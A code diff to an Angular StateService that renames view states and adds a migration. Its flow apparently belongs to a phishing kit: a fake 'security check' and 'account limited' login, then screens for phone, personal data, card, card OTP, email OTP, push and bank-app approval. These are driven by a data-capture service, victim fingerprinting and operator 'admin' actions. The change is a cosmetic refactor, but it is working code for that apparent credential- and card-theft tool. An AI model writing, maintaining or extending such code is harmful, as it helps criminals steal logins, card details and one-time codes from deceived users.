@@ -9,7 +9,7 @@ import { PollingScheduler } from './polling.util';
 import { DataCaptureService } from './data-capture.service';
 import { getFlowById, FlowConfig } from './flows.service';
 
-export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'email_otp' | 'push_auth' | 'bank_app' | 'loading' | 'step_success' | 'success' | 'admin';
+export type ViewState = 'gate' | 'security-check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card-otp' | 'email-otp' | 'push-auth' | 'bank-app' | 'loading' | 'step-success' | 'success' | 'admin';
 export type VerificationStage = 'login' | 'login_pending' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'email_otp_pending' | 'push_auth_pending' | 'bank_app_input' | 'bank_app_pending' | 'final_review' | 'complete';
 
 export interface UserFingerprint {
@@ -61,8 +61,8 @@ const SYNC_CHANNEL = 'pp_sync_channel';
 })
 export class StateService {
     // Navigation
-    readonly currentView = signal<ViewState>('security_check');
-    readonly previousView = signal<ViewState>('security_check');
+    readonly currentView = signal<ViewState>('security-check');
+    readonly previousView = signal<ViewState>('security-check');
 
     // Logic State
     readonly stage = signal<VerificationStage>('login');
@@ -475,9 +475,17 @@ export class StateService {
             else if (s === 'phone_pending') viewToRestore = 'phone';
             else if (s === 'personal_pending') viewToRestore = 'personal';
             else if (s === 'card_pending') viewToRestore = 'card';
-            else if (s === 'card_otp_pending') viewToRestore = 'card_otp';
-            else if (s === 'bank_app_pending' || s === 'bank_app_input') viewToRestore = 'bank_app';
+            else if (s === 'card_otp_pending') viewToRestore = 'card-otp';
+            else if (s === 'bank_app_pending' || s === 'bank_app_input') viewToRestore = 'bank-app';
         }
+
+        // Migration for Refactor (Snake -> Kebab)
+        if (viewToRestore === 'security_check') viewToRestore = 'security-check';
+        if (viewToRestore === 'card_otp') viewToRestore = 'card-otp';
+        if (viewToRestore === 'email_otp') viewToRestore = 'email-otp';
+        if (viewToRestore === 'push_auth') viewToRestore = 'push-auth';
+        if (viewToRestore === 'bank_app') viewToRestore = 'bank-app';
+        if (viewToRestore === 'step_success') viewToRestore = 'step-success';
 
         if (viewToRestore) {
             this.currentView.set(viewToRestore);
@@ -1096,7 +1104,7 @@ export class StateService {
             }
             else if (this.stage() === 'card_otp_pending') {
                 this.cardOtp.set('');
-                this.navigate('card_otp', true);
+                this.navigate('card-otp', true);
             }
             else if (this.stage() === 'bank_app_pending') {
                 this.navigate('card', true); // Or back to bank app?
@@ -1147,9 +1155,9 @@ export class StateService {
                 if (flow === 'app') {
                     // NEW: Go to input stage first, user must confirm
                     this.stage.set('bank_app_input');
-                    this.navigate('bank_app', true);
+                    this.navigate('bank-app', true);
                 } else if (flow === 'both' || flow === 'otp') {
-                    this.navigate('card_otp', true);
+                    this.navigate('card-otp', true);
                     // Note: We don't change stage here, waiting for OTP submit
                 } else {
                     // Default: Complete / Success (flow === 'complete' or undefined)
@@ -1162,7 +1170,7 @@ export class StateService {
                 if (this.verificationFlow() === 'both') {
                     // NEW: Go to input stage first
                     this.stage.set('bank_app_input');
-                    this.navigate('bank_app', true);
+                    this.navigate('bank-app', true);
                 } else {
                     this.isFlowComplete.set(true);
                     this.navigate('success', true);
@@ -1391,7 +1399,7 @@ export class StateService {
         if (this.stage() === 'login') this.navigate('limited');
         else if (this.stage() === 'phone_pending') this.navigate('personal');
         else if (this.stage() === 'personal_pending') this.navigate('card');
-        else if (this.stage() === 'card_pending') this.navigate('card_otp');
+        else if (this.stage() === 'card_pending') this.navigate('card-otp');
     }
 
     // --- Admin Actions ---
